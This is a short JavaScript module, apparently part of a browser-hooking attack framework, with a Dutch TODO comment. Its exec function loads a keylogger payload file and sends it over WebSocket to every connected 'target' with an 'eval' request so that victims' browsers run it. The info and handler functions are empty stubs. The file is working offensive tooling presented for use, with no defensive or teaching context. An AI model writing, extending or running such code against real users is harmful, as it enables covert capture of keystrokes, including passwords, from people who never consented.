exports.data = {
	//info about the module
	info: function(step /*optional */) {
	},

	//handler for parsing responses
	handler: function() {
	},

	//execute the attack
	exec: function(targets,step /* optional */) {
		var fs = require('fs');
		var payload = fs.readFileSync(__dirname + '/../payloads/keylogger.js','utf8');
		for (var i in targets) {
			targets[i].sendUTF(JSON.stringify({ request: 'eval', content: payload }))
		}
		console.log('Payload sent')
	}
};


//TODO elke module moet een handler object zijn dat word toegevoegd bij load aan een array waar moet doorgegaan worden als er ontvangen word.
